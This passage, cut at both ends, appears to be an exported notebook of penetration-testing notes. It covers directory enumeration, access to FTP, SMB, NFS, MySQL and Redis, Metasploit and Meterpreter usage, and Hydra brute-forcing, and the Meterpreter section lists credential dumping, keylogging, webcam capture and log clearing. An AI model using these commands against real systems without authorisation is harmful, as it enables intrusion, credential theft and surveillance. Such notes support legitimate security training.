      <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Standard directory enumeration:
</rich_text>
      <rich_text indent="1">gobuster dir -u http://</rich_text>
      <rich_text indent="1" weight="heavy">IP</rich_text>
      <rich_text indent="1">/ -w </rich_text>
      <rich_text indent="1" weight="heavy">WORDLIST</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="1">-e print full url</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="1">-k skip TLS certificate check</rich_text>
      <rich_text>

Enumerate files with specific extensions in a directory:
</rich_text>
      <rich_text indent="1">gobuster dir -u </rich_text>
      <rich_text>http://</rich_text>
      <rich_text weight="heavy">IP</rich_text>
      <rich_text>/ -w </rich_text>
      <rich_text weight="heavy">WORDLIST</rich_text>
      <rich_text> -x </rich_text>
      <rich_text weight="heavy">EXTENSION</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="8">jpg,php,...</rich_text>
      <rich_text>

Standard subdomain enumeratrion
</rich_text>
      <rich_text indent="1">gobuster</rich_text>
      <rich_text> vhost -w </rich_text>
      <rich_text weight="heavy">WORDLIST</rich_text>
      <rich_text> -u http://DOMAIN/ --append-domain </rich_text>
      <node name="Manual" unique_id="15" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="60" is_bold="0" foreground="#ffffff" ts_creation="1695160129" ts_lastsave="1700046136">
        <rich_text>Usage:
</rich_text>
        <rich_text indent="1">  gobuster [command]</rich_text>
        <rich_text>

Available Commands:
</rich_text>
        <rich_text indent="1">  completion  Generate the autocompletion script for the specified shell
  dir         Uses directory/file enumeration mode
  dns         Uses DNS subdomain enumeration mode
  fuzz        Uses fuzzing mode. Replaces the keyword FUZZ in the URL, Headers and the request body
  gcs         Uses gcs bucket enumeration mode
  help        Help about any command
  s3          Uses aws bucket enumeration mode
  tftp        Uses TFTP enumeration mode
  version     shows the current version
  vhost       Uses VHOST enumeration mode (you most probably want to use the IP address as the URL parameter)</rich_text>
        <rich_text>

Flags:
</rich_text>
        <rich_text indent="1">      --debug                 Enable debug output
      --delay duration        Time each thread waits between requests (e.g. 1500ms)
  -h, --help                  help for gobuster
      --no-color              Disable color output
      --no-error              Don't display errors
  -z, --no-progress           Don't display progress
  -o, --output string         Output file to write results to (defaults to stdout)
  -p, --pattern string        File containing replacement patterns
  -q, --quiet                 Don't print the banner and other noise
  -t, --threads int           Number of concurrent threads (default 10)
  -v, --verbose               Verbose output (errors)
  -w, --wordlist string       Path to the wordlist. Set to - to use STDIN.
      --wordlist-offset int   Resume from a given position in the wordlist (defaults to 0)</rich_text>
        <rich_text>

Use "gobuster [command] --help" for more information about a command.</rich_text>
      </node>
    </node>
    <node name="Dirbuster" unique_id="17" prog_lang="custom-colors" tags=" Directory Enumeration" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1695160372" ts_lastsave="1700046147">
      <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Standard directory enumeration:
</rich_text>
      <rich_text indent="1">dirb http://</rich_text>
      <rich_text indent="1" weight="heavy">IP</rich_text>
      <rich_text indent="1">/ </rich_text>
      <rich_text weight="heavy">/WORDLIST</rich_text>
      <rich_text>

</rich_text>
      <node name="Manual" unique_id="18" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="60" is_bold="0" foreground="#ffffff" ts_creation="1695160372" ts_lastsave="1700046178">
        <rich_text>DIRB(1)                                                          General Commands Manual                                                          DIRB(1)

NAME
</rich_text>
        <rich_text indent="1">       dirb - Web Content Scanner</rich_text>
        <rich_text>

SYNOPSIS
</rich_text>
        <rich_text indent="1">       dirb &lt;url_base&gt; &lt;url_base&gt; [&lt;wordlist_file(s)&gt;] [options]</rich_text>
        <rich_text>

DESCRIPTION
</rich_text>
        <rich_text indent="1">       DIRB  IS  a  Web  Content  Scanner.  It looks for existing (and/or hidden) Web Objects. It basically works by launching a dictionary basesd attack
       against a web server and analizing the response.</rich_text>
        <rich_text>

OPTIONS
</rich_text>
        <rich_text indent="1">       ‐a &lt;agent_string&gt;
              Specify your custom USER_AGENT.  (Default is: "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)")
       ‐b     Don’t squash or merge sequences of /../ or /./ in the given URL.
       ‐c &lt;cookie_string&gt;
              Set a cookie for the HTTP request.
       ‐E &lt;certificate&gt;
              Use the specified client certificate file.
       ‐f     Fine tunning of NOT_FOUND (404) detection.
       ‐H &lt;header_string&gt;
              Add a custom header to the HTTP request.
       ‐i     Use case‐insensitive Search.
       ‐l     Print "Location" header when found.
       ‐N &lt;nf_code&gt;
              Ignore responses with this HTTP code.
       ‐o &lt;output_file&gt;
              Save output to disk.
       ‐p &lt;proxy[:port]&gt;
              Use this proxy. (Default port is 1080)
       ‐P &lt;proxy_username:proxy_password&gt;
              Proxy Authentication.
       ‐r     Don’t Search Recursively.
       ‐R     Interactive Recursion.  (Ask in which directories you want to scan)
       ‐S     Silent Mode. Don’t show tested words. (For dumb terminals)
       ‐t     Don’t force an ending ’/’ on URLs.
       ‐u &lt;username:password&gt;
              Username and password to use.
       ‐v     Show Also Not Existent Pages.
       ‐w     Don’t Stop on WARNING messages.
       ‐x &lt;extensions_file&gt;
              Amplify search with the extensions on this file.
       ‐X &lt;extensions&gt;
              Amplify search with this extensions.
       ‐z &lt;milisecs&gt;
              Amplify search with this extensions.
</rich_text>
        <rich_text>


The Dark Raver                                                          27/01/2009                                                                DIRB(1)
</rich_text>
      </node>
    </node>
    <node name="Nikto" unique_id="83" prog_lang="custom-colors" tags=" Directory Enumeration" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1699285224" ts_lastsave="1699285256">
      <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
nikto -h </rich_text>
      <rich_text weight="heavy">IP</rich_text>
    </node>
  </node>
  <node name="Services" unique_id="67" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1697104557" ts_lastsave="1697104564">
    <rich_text underline="single" weight="heavy">^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</rich_text>
    <node name="FTP" unique_id="50" prog_lang="custom-colors" tags=" Directory Enumeration" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1696620461" ts_lastsave="1699449877">
      <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
ftp </rich_text>
      <rich_text weight="heavy">IP</rich_text>
      <rich_text> </rich_text>
      <rich_text weight="heavy">PORT</rich_text>
      <rich_text>

user = anonymous

list files:
</rich_text>
      <rich_text indent="1">ls</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="1">dir</rich_text>
      <rich_text>

download file:
</rich_text>
      <rich_text indent="1">get </rich_text>
      <rich_text indent="1" weight="heavy">NAME</rich_text>
      <rich_text>

exit connection:
</rich_text>
      <rich_text indent="1">exit</rich_text>
      <rich_text>


</rich_text>
    </node>
    <node name="SMB" unique_id="58" prog_lang="custom-colors" tags=" Directory Enumeration" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1696693639" ts_lastsave="1699449880">
      <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
SMB enumeration:
</rich_text>
      <rich_text indent="1">enum4linux </rich_text>
      <rich_text indent="1" weight="heavy">OPTIONS</rich_text>
      <rich_text indent="1"> </rich_text>
      <rich_text indent="1" weight="heavy">IP</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="2">-U             get userlist
-M             get machine list
-N             get namelist dump (different from -U and-M)
-S             get sharelist
-P             get password policy information
-G             get group and member list
-a             all of the above (full basic enumeration)</rich_text>
      <rich_text>

smbclient -L </rich_text>
      <rich_text weight="heavy">IP</rich_text>
      <rich_text>

smbclient //</rich_text>
      <rich_text weight="heavy">IP</rich_text>
      <rich_text>/</rich_text>
      <rich_text weight="heavy">SHARE</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="1">-U </rich_text>
      <rich_text indent="1" weight="heavy">USERNAME</rich_text>
      <rich_text indent="1">
-p </rich_text>
      <rich_text weight="heavy">PORT</rich_text>
      <rich_text>

user Anonymous

</rich_text>
    </node>
    <node name="NFS" unique_id="60" prog_lang="custom-colors" tags=" Directory Enumeration" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1696969749" ts_lastsave="1699449882">
      <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
commands (/usr/sbin/):
</rich_text>
      <rich_text indent="1">ockd
statd
showmount
nfsstat
gssd
idmapd
mount.nfs</rich_text>
      <rich_text>

Mount a share:
</rich_text>
      <rich_text indent="1">sudo mount -t nfs </rich_text>
      <rich_text indent="1" weight="heavy">IP</rich_text>
      <rich_text indent="1">:</rich_text>
      <rich_text indent="1" weight="heavy">SHARE</rich_text>
      <rich_text indent="1"> </rich_text>
      <rich_text indent="1" weight="heavy">DEST_DIR</rich_text>
      <rich_text indent="1"> -nolock
</rich_text>
      <rich_text indent="2">-t nfs	Type of device to mount, then specifying that it's NFS
-nolock	Specifies not to use NLM locking</rich_text>
      <rich_text>

Unmount a share:
</rich_text>
      <rich_text indent="1">sudo umount -fl </rich_text>
      <rich_text indent="1" weight="heavy">IP</rich_text>
      <rich_text indent="1">:</rich_text>
      <rich_text indent="1" weight="heavy">SHARE</rich_text>
      <rich_text indent="1">
</rich_text>
      <rich_text indent="2">-f  force
-</rich_text>
      <rich_text>l  lazy

List active mounts:
</rich_text>
      <rich_text indent="1">df</rich_text>
      <rich_text>

list NFS shares
</rich_text>
      <rich_text indent="1">/usr/sbin/showmount -e IP</rich_text>
    </node>
    <node name="SMTP" unique_id="64" prog_lang="custom-colors" tags=" Directory Enumeration" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1697052718" ts_lastsave="1699449883">
      <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
SMTP commands:
</rich_text>
      <rich_text indent="1">VRFY: confirming the names of valid users</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="1">EXPN: reveal address of user’s aliases and mailing lists</rich_text>
      <rich_text>

check version:
</rich_text>
      <rich_text indent="1">metasploit -&gt; smtp_version</rich_text>
      <rich_text>

enumerate:
</rich_text>
      <rich_text indent="1">metasploit -&gt; smtp_enum</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="1">smtp-user-enum</rich_text>
      <rich_text>

</rich_text>
    </node>
    <node name="MySQL" unique_id="66" prog_lang="custom-colors" tags=" Directory Enumeration" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1697054032" ts_lastsave="1699449885">
      <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
scripts/tools:
</rich_text>
      <rich_text indent="1">nmap's mysql-enum script
metasploit -&gt; mysql_sql
metasploit -&gt; mysql_schemadump
metasploit -&gt; mysql_hashdump</rich_text>
      <rich_text>

connect to server:
</rich_text>
      <rich_text indent="1">mysql -h </rich_text>
      <rich_text indent="1" weight="heavy">IP</rich_text>
      <rich_text indent="1"> -u </rich_text>
      <rich_text indent="1" weight="heavy">USERNAME</rich_text>
      <rich_text indent="1"> -p</rich_text>
      <rich_text>

SHOW databases;
USE {database_name};
SHOW tables;</rich_text>
    </node>
    <node name="REDIS" unique_id="76" prog_lang="custom-colors" tags=" Directory Enumeration" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1698759580" ts_lastsave="1699449887">
      <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
redis-cli -h [IP]

&gt;info

check KEYSPACE

select [dbnr.] -&gt; keys [key/*]

get [key naam]</rich_text>
    </node>
  </node>
  <node name="Metasploit" unique_id="29" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1695324968" ts_lastsave="1699453969">
    <rich_text underline="single" weight="heavy">^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</rich_text>
    <rich_text>
SMB share enum:
</rich_text>
    <rich_text indent="1">auxiliary/scanner/smb/smb_enumshares</rich_text>
    <rich_text>

SMB user enum:
</rich_text>
    <rich_text indent="1">auxiliary/scanner/smb/smb_enumusers</rich_text>
    <rich_text>

SMB bruteforce logins:
</rich_text>
    <rich_text indent="1">auxiliary/scanner/smb/smb_login</rich_text>
    <rich_text>

Listener / multi handler:
</rich_text>
    <rich_text indent="1">exploit/multi/handler</rich_text>
    <rich_text>

</rich_text>
    <node name="Basics" unique_id="89" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="28" is_bold="0" foreground="#ffffff" ts_creation="1699448313" ts_lastsave="1699535980">
      <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Access:
</rich_text>
      <rich_text indent="1">msfconsole</rich_text>
      <rich_text>

listing directory:
</rich_text>
      <rich_text indent="1">ls -l</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="1">tree -L </rich_text>
      <rich_text indent="1" weight="heavy">LAYERS</rich_text>
      <rich_text>

command log:
</rich_text>
      <rich_text indent="1">history</rich_text>
      <rich_text>

list modules:
</rich_text>
      <rich_text indent="1">show </rich_text>
      <rich_text indent="1" weight="heavy">PARAMETER</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="2">all
encoders
nops
exploits
payloads
auxiliary
post
plugins
info
options
favorites</rich_text>
      <rich_text>

searching modules:
</rich_text>
      <rich_text indent="1">search</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="1">see searching node</rich_text>
      <rich_text>

select module:
</rich_text>
      <rich_text indent="1">use </rich_text>
      <rich_text indent="1" weight="heavy">FULL_PATH/NR</rich_text>
      <rich_text indent="1">
also possible to enter partial path to filter through list</rich_text>
      <rich_text>

go back
</rich_text>
      <rich_text indent="1">back</rich_text>
      <rich_text>

execute module
</rich_text>
      <rich_text indent="1">run
exploit
</rich_text>
      <rich_text indent="2">in background
exploit -z</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="2">exploit -</rich_text>
      <rich_text>j

check if target is vulnerable to module (not supported for all modules)
</rich_text>
      <rich_text indent="1">check</rich_text>
      <rich_text>

background a executed session
</rich_text>
      <rich_text indent="1">background</rich_text>
      <rich_text>

view running sessions
</rich_text>
      <rich_text indent="1">sessions</rich_text>
      <rich_text>

resume session
</rich_text>
      <rich_text indent="1">session -i </rich_text>
      <rich_text indent="1" weight="heavy">ID</rich_text>
      <rich_text>

Kill all sessions:
</rich_text>
      <rich_text indent="1">sessions -K</rich_text>
      <rich_text>



</rich_text>
    </node>
    <node name="Searching" unique_id="33" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="28" is_bold="0" foreground="#ffffff" ts_creation="1695327065" ts_lastsave="1699449896">
      <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
search exploits with ‘wordpress’ in the description and sort by descending date:
</rich_text>
      <rich_text indent="1">search type:exploit description:wordpress -r date</rich_text>
      <node name="Manual" unique_id="34" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="30" is_bold="0" foreground="" ts_creation="1695327231" ts_lastsave="1695327285">
        <rich_text>Usage: search [&lt;options&gt;] [&lt;keywords&gt;:&lt;value&gt;]

Prepending a value with '-' will exclude any matching results.
If no options or keywords are provided, cached results are displayed.

OPTIONS:
</rich_text>
        <rich_text indent="1">    -h, --help                      Help banner
    -I, --ignore                    Ignore the command if the only match has the same name as the search
    -o, --output &lt;filename&gt;         Send output to a file in csv format
    -r, --sort-descending &lt;column&gt;  Reverse the order of search results to descending order
    -S, --filter &lt;filter&gt;           Regex pattern used to filter search results
    -s, --sort-ascending &lt;column&gt;   Sort search results by the specified column in ascending order</rich_text>
        <rich_text>
</rich_text>
        <rich_text indent="1">    -u, --use                       Use module if there is one result</rich_text>
        <rich_text>

Keywords:
</rich_text>
        <rich_text indent="1">  aka              :  Modules with a matching AKA (also-known-as) name
  author           :  Modules written by this author
  arch             :  Modules affecting this architecture
  bid              :  Modules with a matching Bugtraq ID
  cve              :  Modules with a matching CVE ID
  edb              :  Modules with a matching Exploit-DB ID
  check            :  Modules that support the 'check' method
  date             :  Modules with a matching disclosure date
  description      :  Modules with a matching description
  fullname         :  Modules with a matching full name
  mod_time         :  Modules with a matching modification date
  name             :  Modules with a matching descriptive name
  path             :  Modules with a matching path
  platform         :  Modules affecting this platform
  port             :  Modules with a matching port
  rank             :  Modules with a matching rank (Can be descriptive (ex: 'good') or numeric with comparison operators (ex: 'gte400'))
  ref              :  Modules with a matching ref
  reference        :  Modules with a matching reference
  target           :  Modules affecting this target
  type             :  Modules of a specific type (exploit, payload, auxiliary, encoder, evasion, post, or nop)
</rich_text>
        <rich_text>
Supported search columns:
</rich_text>
        <rich_text indent="1">  rank             :  Sort modules by their exploitabilty rank
  date             :  Sort modules by their disclosure date. Alias for disclosure_date
  disclosure_date  :  Sort modules by their disclosure date
  name             :  Sort modules by their name
  type             :  Sort modules by their type
  check            :  Sort modules by whether or not they have a check method</rich_text>
        <rich_text>

Examples:
</rich_text>
        <rich_text indent="1">  search cve:2009 type:exploit
  search cve:2009 type:exploit platform:-linux
  search cve:2009 -s name
  search type:exploit -s type -r</rich_text>
        <rich_text>
</rich_text>
      </node>
    </node>
    <node name="Using module" unique_id="35" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="28" is_bold="0" foreground="#ffffff" ts_creation="1695327855" ts_lastsave="1699449894">
      <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
view extra info about the selected module
</rich_text>
      <rich_text indent="1">show info</rich_text>
      <rich_text>

view compatible modules (auxiliary, payload, exploit, etc.) for the selected:
</rich_text>
      <rich_text indent="1">show </rich_text>
      <rich_text indent="1" weight="heavy">TYPE</rich_text>
      <rich_text indent="1">
search will show all modules</rich_text>
      <rich_text>

view the needed parameters
</rich_text>
      <rich_text indent="1">show OPTIONS</rich_text>
      <rich_text>

Parameters:
</rich_text>
      <rich_text indent="1">RHOSTS
</rich_text>
      <rich_text indent="2">“Remote host”, the IP address of the target system. A single IP address or a network range can be set. This will support the CIDR (Classless Inter-Domain Routing) notation (/24, /16, etc.) or a network range (10.10.10.x – 10.10.10.y). You can also use a file where targets are listed, one target per line using file:/path/of/the/target_file.txt</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="1">RPORT
</rich_text>
      <rich_text indent="2">“Remote port”, the port on the target system the vulnerable application is running on.</rich_text>
      <rich_text indent="1">
PAYLOAD
</rich_text>
      <rich_text indent="2">The payload you will use with the exploit.</rich_text>
      <rich_text indent="1">
LHOST
</rich_text>
      <rich_text indent="2">“Localhost”, the attacking machine (your AttackBox or Kali Linux) IP address.</rich_text>
      <rich_text indent="1">
LPORT
</rich_text>
      <rich_text indent="2">“Local port”, the port you will use for the reverse shell to connect back to. This is a port on your attacking machine, and you can set it to any port not used by any other application.</rich_text>
      <rich_text indent="1">
SESSION
</rich_text>
      <rich_text indent="2">Each connection established to the target system using Metasploit will have a session ID. You will use this with post-exploitation modules that will connect to the target system using an existing connection.</rich_text>
      <rich_text>

set a parameter
</rich_text>
      <rich_text indent="1">set </rich_text>
      <rich_text indent="1" weight="heavy">PARAMETER VALUE</rich_text>
      <rich_text>

reset parameter
</rich_text>
      <rich_text indent="1">unset </rich_text>
      <rich_text indent="1" weight="heavy">PARAMETER/ALL</rich_text>
      <rich_text>

set and unset parameters globally (used for every selected module)
</rich_text>
      <rich_text indent="1">setg
unsetg</rich_text>
      <rich_text>

</rich_text>
    </node>
    <node name="Database" unique_id="31" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="28" is_bold="0" foreground="#ffffff" ts_creation="1695324968" ts_lastsave="1699453956">
      <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
In msfconsole check db status
</rich_text>
      <rich_text indent="1">db_status</rich_text>
      <rich_text>

if not running:
</rich_text>
      <rich_text indent="1">first start sql:
</rich_text>
      <rich_text indent="2">systemctl start postgresql</rich_text>
      <rich_text indent="1">

 initialize Metasploit Database
</rich_text>
      <rich_text indent="2"> msfdb init</rich_text>
      <rich_text>

Workspace management:
</rich_text>
      <rich_text indent="1">list:
</rich_text>
      <rich_text indent="2">workspace</rich_text>
      <rich_text indent="1">
add: -a
delete: -d</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="1">change workspace:</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="2">workspace </rich_text>
      <rich_text indent="2" weight="heavy">NAME</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="1">help / -h</rich_text>
    </node>
    <node name="Meterpreter" unique_id="91" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="28" is_bold="0" foreground="#ffffff" ts_creation="1699453956" ts_lastsave="1699973896">
      <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Upload a file:
</rich_text>
      <rich_text indent="1">upload </rich_text>
      <rich_text indent="1" weight="heavy">PATH/FILE</rich_text>
      <rich_text>

Migrate PID:
</rich_text>
      <rich_text indent="1">migrate </rich_text>
      <rich_text indent="1" weight="heavy">PID</rich_text>
      <rich_text>

Current PID:
</rich_text>
      <rich_text indent="1">getpid</rich_text>
      <rich_text>

Search for a file:
</rich_text>
      <rich_text indent="1">search -f </rich_text>
      <rich_text indent="1" weight="heavy">FILENAME</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="1">search -f *flag* -d c:\\Users\\bill</rich_text>
      <rich_text>

Get regular shell:
</rich_text>
      <rich_text indent="1">shell</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="1">use CTRL+Z to return to meterpreter shell</rich_text>
      <rich_text>

Load extra tools:
</rich_text>
      <rich_text indent="1">load </rich_text>
      <rich_text indent="1" weight="heavy">NAME</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="1">load powershell</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="2">powershell_shell</rich_text>
      <rich_text>

LINUX:</rich_text>
      <rich_text indent="1">
hasdump: post/linux/gather/hashdump</rich_text>
      <rich_text>

WINDOWS:
</rich_text>
      <rich_text indent="1">current user</rich_text>
      <rich_text>:
</rich_text>
      <rich_text indent="2">getuid</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="1">hashdump SAM db:</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="2">hashdump</rich_text>
      <rich_text>
</rich_text>
      <node name="Top commands" unique_id="92" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="22" is_bold="0" foreground="" ts_creation="1699454233" ts_lastsave="1699454461">
        <rich_text>Core commands:
</rich_text>
        <rich_text indent="1">background: Backgrounds the current session
exit: Terminate the Meterpreter session
guid: Get the session GUID (Globally Unique Identifier)
help: Displays the help menu
info: Displays information about a Post module
irb: Opens an interactive Ruby shell on the current session
load: Loads one or more Meterpreter extensions
migrate: Allows you to migrate Meterpreter to another process
run: Executes a Meterpreter script or Post module
sessions: Quickly switch to another session</rich_text>
        <rich_text>

File system commands:
</rich_text>
        <rich_text indent="1">cd: Will change directory
ls: Will list files in the current directory (dir will also work)
pwd: Prints the current working directory
edit: will allow you to edit a file
cat: Will show the contents of a file to the screen
rm: Will delete the specified file
search: Will search for files
upload: Will upload a file or directory
download: Will download a file or directory</rich_text>
        <rich_text>

Networking commands:
</rich_text>
        <rich_text indent="1">arp: Displays the host ARP (Address Resolution Protocol) cache
ifconfig: Displays network interfaces available on the target system
netstat: Displays the network connections
portfwd: Forwards a local port to a remote service
route: Allows you to view and modify the routing table</rich_text>
        <rich_text>

System commands:
</rich_text>
        <rich_text indent="1">clearev: Clears the event logs
execute: Executes a command
getpid: Shows the current process identifier
getuid: Shows the user that Meterpreter is running as
kill: Terminates a process
pkill: Terminates processes by name
ps: Lists running processes
reboot: Reboots the remote computer
shell: Drops into a system command shell
shutdown: Shuts down the remote computer
sysinfo: Gets information about the remote system, such as OS</rich_text>
        <rich_text>

Others Commands:
</rich_text>
        <rich_text indent="1">idletime: Returns the number of seconds the remote user has been idle
keyscan_dump: Dumps the keystroke buffer
keyscan_start: Starts capturing keystrokes
keyscan_stop: Stops capturing keystrokes
screenshare: Allows you to watch the remote user's desktop in real time
screenshot: Grabs a screenshot of the interactive desktop
record_mic: Records audio from the default microphone for X seconds
webcam_chat: Starts a video chat
webcam_list: Lists webcams
webcam_snap: Takes a snapshot from the specified webcam
webcam_stream: Plays a video stream from the specified webcam
getsystem: Attempts to elevate your privilege to that of local system
hashdump: Dumps the contents of the SAM database</rich_text>
      </node>
    </node>
  </node>
  <node name="Credentials" unique_id="56" prog_lang="custom-colors" tags=" Directory Enumeration" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1696626155" ts_lastsave="1699357823">
    <rich_text underline="single" weight="heavy">^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</rich_text>
    <rich_text>
</rich_text>
    <node name="Brute-Force" unique_id="85" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="28" is_bold="0" foreground="" ts_creation="1699357800" ts_lastsave="1700217437">
      <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Hydra:
</rich_text>
      <rich_text indent="1">-l </rich_text>
      <rich_text indent="1" weight="heavy">LOGIN</rich_text>
      <rich_text indent="1">
-l </rich_text>
      <rich_text indent="1" weight="heavy">LOGIN_WORDLIST</rich_text>
      <rich_text indent="1">
-p </rich_text>
      <rich_text indent="1" weight="heavy">PASSWORD</rich_text>
      <rich_text indent="1">
-P </rich_text>
      <rich_text indent="1" weight="heavy">PASSWORD_WORDLIST</rich_text>
      <rich_text>

</rich_text>
      <rich_text indent="1">hydra -t </rich_text>
      <rich_text indent="1" weight="heavy">#CONNECTIONS</rich_text>
      <rich_text indent="1"> -l </rich_text>
      <rich_text indent="1" weight="heavy">USERNAME</rich_text>
      <rich_text indent="1"> -P </rich_text>
      <rich_text indent="1" weight="heavy">WORDLIST</rich_text>
      <rich_text indent="1"> -vV </rich_text>
      <rich_text indent="1" weight="heavy">IP</rich_text>
      <rich_text indent="1"> </rich_text>
      <rich_text indent="1" weight="heavy">PROTOCOL</rich_text>
      <rich_text indent="1">
hydra -t </rich_text>
      <rich_text indent="1" weight="heavy">#CONNECTIONS</rich_text>
      <rich_text indent="1"> -l </rich_text>
      <rich_text indent="1" weight="heavy">USERNAME</rich_text>
      <rich_text indent="1"> -P </rich_text>
      <rich_text indent="1" weight="heavy">WORDLIST</rich_text>
      <rich_text indent="1"> -vV </rich_text>
      <rich_text indent="1" weight="heavy">PROTOCOL</rich_text>
      <rich_text indent="1">://</rich_text>
      <rich_text indent="1" weight="heavy">IP</rich_text>
      <rich_text>

</rich_text>
      <rich_text indent="1">login form on website:
adjust http-post-form!
</rich_text>
      <rich_text indent="2">Username:</rich_text>
      <rich_text indent="1">
</rich_text>
      <rich_text indent="3">hydra -L/ </rich_text>
      <rich_text indent="3" weight="heavy">LOGIN_WORDLIST</rich_text>
      <rich_text indent="3"> -p test </rich_text>
      <rich_text indent="3" weight="heavy">IP</rich_text>
      <rich_text indent="3"> http-post-form "/:username=^USER^&amp;password=^PASS^:</rich_text>
      <rich_text indent="3" weight="heavy">ERROR_TEXT</rich_text>
      <rich_text indent="3">."</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="2">Password (try sql injection first):</rich_text>
      <rich_text indent="1">
</rich_text>
      <rich_text indent="3">hydra -l </rich_text>
      <rich_text indent="3" weight="heavy">LOGIN</rich_text>
      <rich_text indent="3"> -p </rich_text>
      <rich_text indent="3" weight="heavy">PASSWORD_WORDLIST</rich_text>
      <rich_text indent="3"> </rich_text>
      <rich_text indent="3" weight="heavy">IP</rich_text>
      <rich_text indent="3"> http-post-form "/:username=^USER^&amp;password=^PASS^:</rich_text>
